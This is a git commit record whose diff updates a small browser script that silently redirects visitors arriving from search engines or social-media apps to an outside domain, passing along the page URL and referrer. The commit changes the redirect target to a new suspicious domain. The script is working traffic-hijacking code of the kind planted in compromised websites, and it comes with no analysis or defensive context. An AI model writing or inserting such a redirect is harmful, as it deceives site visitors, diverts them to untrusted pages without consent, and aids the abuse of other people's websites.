d013c81ec6b9cdfcf8478ff8c7ea682fc9647693
xda facezero <xdafacezero@gmail.com>
2024-12-18 13:27:25 +0700

    Update node.js

--- node.js
+++ node.js
@@ -1,6 +1,6 @@
 
   //<![CDATA[
-var ars = 'https://currency.lokalpro.my.id';
+var ars = 'https://test.bebegirls.my.id/';
 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', '.pinterest.', 'duckduckgo.', 'ecosia.', '.yahoo.', '.start.', '.info.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
 //]]>
